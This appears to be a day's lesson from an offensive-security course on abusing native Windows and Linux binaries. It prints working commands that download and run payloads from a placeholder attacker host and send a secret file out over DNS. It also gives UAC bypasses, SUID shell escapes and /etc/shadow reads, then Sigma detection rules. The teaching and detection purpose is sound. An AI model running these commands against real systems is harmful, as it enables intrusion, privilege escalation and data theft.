---
title: "Living off the Land — LOLBins, LOLBas, and Native Tool Abuse"
tags: [LOLBins, LOLBAS, living-off-the-land, evasion, native-tools,
       PowerShell, certutil, mshta, regsvr32, T1218, T1059, ATT&CK]
module: 04-BroadSurface-04
day: 243
related_topics:
  - Post-Exploitation Basics (Day 241)
  - C2 Concepts and Sliver Lab (Day 242)
  - Infrastructure Detection and Hardening (Day 244)
  - Red Team Operations (Day 305)
---

# Day 243 — Living off the Land: LOLBins and Native Tool Abuse

> "The best attacker tool is the one already installed on the target. A signed
> Microsoft binary with a legitimate certificate is more trusted than anything
> you bring in. When you execute code through certutil or mshta or regsvr32,
> you are not running an attacker tool — you are running a Windows operating
> system component. That distinction matters to antivirus. It matters less to
> behavioural detection. Know both sides."
>
> — Ghost

---

## Goals

By the end of today's session you will be able to:

1. Explain what LOLBins/LOLBAS are and why they exist as an attack surface.
2. Use at least six native Windows binaries for attacker purposes (download,
   execute, bypass, encode).
3. Use native Linux utilities for privilege escalation and lateral movement.
4. Understand which native tools trigger behavioural EDR and which do not.
5. Write detection rules for the most commonly abused LOLBins.

**Time budget:** 4 hours.

---

## Prerequisites

| Requirement | Covered in |
|---|---|
| Post-exploitation concepts | Day 241 |
| Windows PowerShell basics | Day 238 |
| Linux command line | Days 9–16 |

---

## Part 1 — What Are LOLBins?

**LOLBins** (Living Off the Land Binaries) are legitimate operating system
binaries that can be abused by attackers to:
- Download files from the internet
- Execute code without spawning obvious attacker processes
- Bypass application allowlisting (AppLocker, WDAC)
- Encode/decode data to evade DLP filters
- Establish persistence without dropping new executables

**Why they matter:** Signature-based AV cannot flag a signed Microsoft binary
as malicious. LOLBins produce the same event logs as legitimate usage — the
difference is context (who ran it, from where, when, with what arguments).

**References:**
- Windows: https://lolbas-project.github.io/
- Linux: https://gtfobins.github.io/

---

## Part 2 — Windows LOLBins

### File Download

```powershell
# certutil (downloads and optionally base64-decodes)
certutil.exe -urlcache -split -f http://<attacker-ip>/shell.exe C:\Temp\shell.exe

# bitsadmin (Background Intelligent Transfer Service)
bitsadmin /transfer GhostJob /download /priority FOREGROUND \
  http://<attacker-ip>/shell.exe C:\Temp\shell.exe

# PowerShell (many variants):
(New-Object Net.WebClient).DownloadFile('http://<attacker-ip>/shell.exe', 'C:\Temp\shell.exe')
Invoke-WebRequest -Uri http://<attacker-ip>/shell.exe -OutFile C:\Temp\shell.exe

# msiexec (downloads and executes MSI):
msiexec /q /i http://<attacker-ip>/payload.msi

# regsvr32 (downloads and registers a COM DLL — called Squiblydoo):
regsvr32 /s /n /u /i:http://<attacker-ip>/payload.sct scrobj.dll
```

### Code Execution / AppLocker Bypass

```powershell
# mshta (executes HTA applications — HTML application):
mshta http://<attacker-ip>/payload.hta
# payload.hta contains VBScript or JScript that runs code

# regsvr32 (Squiblydoo — executes scriptlet from URL):
regsvr32 /s /n /u /i:http://<attacker-ip>/malicious.sct scrobj.dll

# wscript / cscript (execute JScript or VBScript):
wscript C:\Temp\payload.js
cscript //nologo \\<attacker-ip>\share\payload.vbs

# rundll32 (execute exported function from DLL):
rundll32 C:\Temp\payload.dll,DllMain
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";eval(...)

# forfiles (find files and execute command per result):
forfiles /p C:\Windows\System32 /m calc.exe /c "cmd /c C:\Temp\shell.exe"

# PresentationHost.exe (XAML Browser Application execution):
PresentationHost.exe -debug http://<attacker-ip>/payload.xbap

# Installutil (executes embedded code in a .NET binary):
installutil.exe /logfile= /LogToConsole=false /U C:\Temp\payload.exe
```

### Data Encoding/Exfiltration

```powershell
# certutil — base64 encode a file
certutil -encode C:\Temp\sensitive.txt C:\Temp\encoded.b64

# certutil — base64 decode
certutil -decode C:\Temp\encoded.b64 C:\Temp\decoded.bin

# PowerShell — base64 encode a command (for obfuscation)
$cmd = 'whoami'
$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -enc $enc

# DNS exfiltration (native nslookup):
$data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((cat C:\Temp\secret.txt)))
nslookup "$data.attacker-domain.com" <attacker-dns-ip>
```

### Privilege Escalation via LOLBins

```powershell
# fodhelper.exe — UAC bypass (Windows 10, all versions before patch)
# Creates a registry key that fodhelper executes on launch with high integrity:
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe
# Result: cmd.exe opens at high (admin) integrity level

# eventvwr.exe — UAC bypass (older Windows 10)
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe

# ComputerDefaults.exe — UAC bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
ComputerDefaults.exe
```

---

## Part 3 — Linux LOLBins

### File Download (No wget/curl)

```bash
# If neither wget nor curl is available:

# bash TCP redirect
bash -c 'cat < /dev/tcp/<attacker-ip>/8000 > /tmp/shell'
# (attacker serves the file: nc -lvp 8000 < shell)

# Python (often available):
python3 -c "import urllib.request; urllib.request.urlretrieve('http://<attacker-ip>/shell', '/tmp/shell')"

# Perl:
perl -le 'use LWP::Simple; getstore("http://<attacker-ip>/shell", "/tmp/shell")'

# php:
php -r 'file_put_contents("/tmp/shell", file_get_contents("http://<attacker-ip>/shell"));'

# openssl:
openssl s_client -connect <attacker-ip>:443 < /dev/null 2>/dev/null | \
  sed -n '/^$/,/^$/p' | base64 -d > /tmp/shell
```

### Code Execution with SUID

```bash
# These are documented on GTFOBins with SUID sections

# awk
awk 'BEGIN {system("/bin/bash -p")}'

# python (with SUID or sudo)
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# ed (line editor — if SUID)
ed
!/bin/bash -p

# tclsh / expect (scripting engines)
tclsh << EOF
exec bash -p
EOF

# nmap (pre-2.02 with --interactive mode)
nmap --interactive
!bash -p
```

### File Read (Bypassing Permissions)

```bash
# openssl (can read arbitrary files if run with elevated privilege)
openssl enc -in /etc/shadow

# dd (raw block read)
dd if=/etc/shadow 2>/dev/null

# tar (extract to stdout, read arbitrary files from archive)

# cp (if SUID — copy shadow to readable location)
cp /etc/shadow /tmp/shadow_copy
```

---

## Part 4 — Detection: Behavioural Signatures

Native tools become suspicious in certain contexts. EDR focuses on:

| Indicator | What it means |
|---|---|
| `certutil` making network connections | Download — legitimate certutil rarely touches the internet |
| `mshta.exe` spawning `cmd.exe` or `powershell.exe` | HTA execution → shell |
| `regsvr32.exe` with a URL argument | Squiblydoo — nearly always malicious |
| `powershell.exe` with `-enc` flag | Encoded command — evading logging |
| `rundll32.exe` with javascript: in args | Script execution via rundll32 |
| `schtasks.exe` or `at.exe` creating new tasks | Persistence |
| `wscript.exe` spawning network tools | Script-based lateral movement |

### Sigma Rules for Common LOLBins

```yaml
title: Certutil Downloading File from Network
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-verifyctl'
      - '-decode'
      - '-decodehex'
  filter_legitimate:
    CommandLine|contains: 'ldap'  # legitimate cert validation
  condition: selection and not filter_legitimate
falsepositives:
  - Certificate validation workflows
level: high
tags:
  - attack.t1105
  - attack.t1140

---

title: Regsvr32 Squiblydoo — URL Argument
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\regsvr32.exe'
    CommandLine|contains:
      - 'http'
      - 'ftp'
      - 'scrobj'
      - '/i:'
  condition: selection
falsepositives:
  - COM object registration with remote path (very rare in legitimate use)
level: critical
tags:
  - attack.t1218.010

---

title: Mshta Spawning Shell Process
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\mshta.exe'
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\wscript.exe'
      - '\cscript.exe'
  condition: selection
level: critical
tags:
  - attack.t1218.005
```

---

## Key Takeaways

1. **The binary is trusted; the context is not.** Windows Defender allows certutil
   to run because it is a legitimate Microsoft tool. Behavioural EDR fires when
   certutil makes an HTTP connection — because that is not what certutil is for.
   The detection is on behaviour, not the binary.
2. **AppLocker/WDAC bypass requires knowing the whitelist.** These controls
   work by allowlisting signed binaries. LOLBins that are always allowlisted
   (mshta, regsvr32, rundll32) bypass the whitelist entirely — which is why
   Microsoft has been restricting their functionality in recent Windows versions.
3. **PowerShell `-enc` is not stealth.** It was 10 years ago. Every modern EDR
   baseline includes script block logging that decodes and logs `-enc` content.
   Use it only as a formatting convenience in the lab, not as an evasion technique.
4. **Detection is context, not content.** The same `wget http://example.com/file`
   command is legitimate from an admin's shell and suspicious from `www-data`.
   Good detection rules include parent process, user context, and working
   directory — not just the command.
5. **The LOLBAS and GTFOBins projects are maintained and searchable.** Bookmark
   them. When you land on a system with restricted tooling, start there — search
   for any binary you find and check if it has an abuse path.

---

## Exercises

1. On a Windows VM, demonstrate five different LOLBins that can download a file
   from a remote URL without using a browser. For each, capture the event logs
   generated and identify which would fire on a standard EDR ruleset.

2. On a Linux system, find five binaries available on the target that do not
   appear in your standard PATH but can be used to read files or execute
   commands. Document the abuse path for each.

3. Write a Sigma rule that detects `fodhelper.exe` UAC bypass by monitoring
   for the registry key creation under `HKCU\Software\Classes\ms-settings`
   followed by `fodhelper.exe` process creation within 30 seconds.

4. Research: what is Application Guard for Office and Windows Sandbox? How do
   they prevent LOLBin abuse? Are there known bypass techniques for these
   controls as of the current Windows version?

---

## Questions

> Add your questions here. Each question gets a Global ID (Q243.1, Q243.2 …).
> Follow-up questions use hierarchical numbering (Q243.1.1, Q243.1.2 …).

---

## Navigation

← Previous: [Day 242 — C2 Concepts and Sliver Lab](DAY-0242-C2-Concepts-and-Sliver-Lab.md)
→ Next: [Day 244 — Infrastructure Detection and Hardening](DAY-0244-Infrastructure-Detection-and-Hardening.md)
